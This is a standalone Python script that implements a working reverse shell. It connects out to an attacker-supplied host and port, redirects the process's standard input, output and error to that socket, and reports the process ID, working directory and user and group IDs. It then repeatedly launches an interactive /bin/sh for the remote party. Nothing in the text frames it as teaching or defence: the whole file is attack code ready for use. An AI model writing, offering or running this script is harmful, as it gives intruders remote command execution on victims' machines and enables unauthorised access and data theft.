#!/usr/bin/env python3
import subprocess as sp
import socket
import sys
import os


def get_connection(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, int(port)))
    return client


def set_descriptors(fd):
    fileno = fd.fileno()
    os.dup2(fileno, 1)
    os.dup2(fileno, 2)
    os.dup2(fileno, 0)


def get_info():
    info = {
        'pid': os.getpid(),
        'cwd': os.getcwd(),
        'uid': os.getuid(),
        'gid': os.getgid()
    }

    info = ['{}:{}'.format(key, val) for (key, val) in info.items()]
    return '|'.join(info)


def main(host=sys.argv[1], port=sys.argv[2]):
    with get_connection(host, port) as client:
        set_descriptors(client)
        info = get_info()

        while True:
            print('rShell successfully started!')
            print(info)
            sp.call(['/bin/sh', '-i'], shell=True)


if __name__ == '__main__':
    main()
